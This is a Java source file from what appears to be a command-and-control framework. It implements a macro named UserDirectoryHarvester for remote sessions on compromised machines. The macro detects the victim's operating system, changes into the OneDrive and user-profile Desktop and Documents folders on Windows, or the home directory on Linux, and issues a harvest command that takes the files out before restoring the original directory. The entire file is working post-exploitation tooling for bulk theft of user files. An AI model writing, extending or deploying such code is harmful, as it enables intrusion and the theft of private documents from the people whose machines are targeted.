package c2.session.macro;

import c2.Commands;
import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.WindowsCmdLineHelper;

public class UserDirectoryHarvester extends AbstractCommandMacro {

	public static String HARVEST_USER_DIRS_CMD = "harvest_user_dir";
	
	private IOManager io;
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equals(HARVEST_USER_DIRS_CMD);
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		this.io = io;
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		
		io.sendCommand(sessionId, Commands.OS_HERITAGE);
		outcome.addSentCommand(Commands.OS_HERITAGE);
		String response = io.awaitMultilineCommands(sessionId);
		outcome.addResponseIo(response);
		response = response.replace(System.lineSeparator(), "");
		if(!response.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS) && !response.equals(Commands.OS_HERITAGE_RESPONSE_LINUX)) {
			outcome.addError("Unsupported operating system: " + response);
			return outcome;
		}
		
		String os = response;
		
		io.sendCommand(sessionId, Commands.PWD);
		outcome.addSentCommand(Commands.PWD);
		response = io.awaitMultilineCommands(sessionId);
		String originalDirectory = null;
		if (!response.equals("")) {
			outcome.addResponseIo(response);
			outcome.addMacroMessage("Saving original working directory, proceeding with macro");
			originalDirectory = response.replace(System.lineSeparator(), "");
		}else {
			outcome.addError("Unable to save current working directory, aborting macro.");
			return outcome;
		}
		
		if(os.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS)) {
		
		try {
			String onedriveDir = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%ONEDRIVE%");
			outcome.addMacroMessage("Found OneDrive folder: " + onedriveDir);
			String cdToODDesktopCmd = Commands.CD + " " + onedriveDir + "\\Desktop";
			outcome.addSentCommand(cdToODDesktopCmd);
			io.sendCommand(sessionId, cdToODDesktopCmd);
			response = io.awaitMultilineCommands(sessionId);
			outcome.addResponseIo(response);
			response = response.replace(System.lineSeparator(), "");
			if (!response.equals(onedriveDir + "\\Desktop")) {
				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
			} else {
				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
				response = io.awaitMultilineCommands(sessionId);
				outcome.addResponseIo(response);
			}
			String cdToODDocumentsCmd = Commands.CD + " "  + onedriveDir + "\\Documents";
			outcome.addSentCommand(cdToODDocumentsCmd);
			io.sendCommand(sessionId, cdToODDocumentsCmd);
			response = io.awaitMultilineCommands(sessionId);
			outcome.addResponseIo(response);
			response = response.replace(System.lineSeparator(), "");
			if (!response.contains(onedriveDir + "\\Documents")) {//Why contains? b/c we might get the Harvest Complete ack too
				outcome.addError("Unable to switch to OneDrive Documents for harvest");
			} else {
				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
				response = io.awaitMultilineCommands(sessionId);
				outcome.addResponseIo(response);
			}
		}catch (Exception ex) {
			outcome.addMacroMessage("Could not find OneDrive folder, proceeding.");
		}
		
		try {
			String profileDir = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%USERPROFILE%");
			outcome.addMacroMessage("Found user profile folder: " + profileDir);
			String cdToDesktopCmd = Commands.CD + " "  + profileDir + "\\Desktop";
			outcome.addSentCommand(cdToDesktopCmd);
			io.sendCommand(sessionId, cdToDesktopCmd);
			response = io.awaitMultilineCommands(sessionId);
			outcome.addResponseIo(response);
			if (!response.contains(profileDir + "\\Desktop")) {//We still might get the "harvest complete"
				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
			} else {
				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
				response = io.awaitMultilineCommands(sessionId);
				outcome.addResponseIo(response);
			}
			String cdToDocumentsCmd = Commands.CD + " "  + profileDir + "\\Documents";
			outcome.addSentCommand(cdToDocumentsCmd);
			io.sendCommand(sessionId, cdToDocumentsCmd);
			response = io.awaitMultilineCommands(sessionId);
			outcome.addResponseIo(response);
			if (!response.contains(profileDir + "\\Documents")) {//Why contains? b/c we might get the Harvest Complete ack too
				outcome.addError("Unable to switch to OneDrive Documents for harvest");
			} else {
				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
				response = io.awaitMultilineCommands(sessionId);
				outcome.addResponseIo(response);
			}
		}catch (Exception ex) {
			outcome.addMacroMessage("Could not find user profile folder, proceedind.");
		}
		}else {//Linux
			String cdToHomeDir = Commands.CD + " ~";
			outcome.addSentCommand(cdToHomeDir);
			io.sendCommand(sessionId, cdToHomeDir);
			response = io.awaitMultilineCommands(sessionId);
			outcome.addResponseIo(response);
			if(response.contains("no such file or directory")) {
				outcome.addError("Cannot switch to Linux home directory");
			}else {
				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
				response = io.awaitMultilineCommands(sessionId);
				outcome.addResponseIo(response);
			}
		}
		
		//Restore original
		io.sendCommand(sessionId, Commands.CD + " " + originalDirectory);
		outcome.addSentCommand(Commands.CD + " " + originalDirectory);
		response = io.awaitMultilineCommands(sessionId);
		response = response.replace(System.lineSeparator(), "");
		outcome.addResponseIo(response);
		if (!response.equals(originalDirectory)) {
			outcome.addError("Unable to switch to original directory for harvest");
		} else {
			outcome.addMacroMessage(
					"Original working directory resumed, harvest underway in the background if directories found");
		}
		
		return outcome;
	}

}
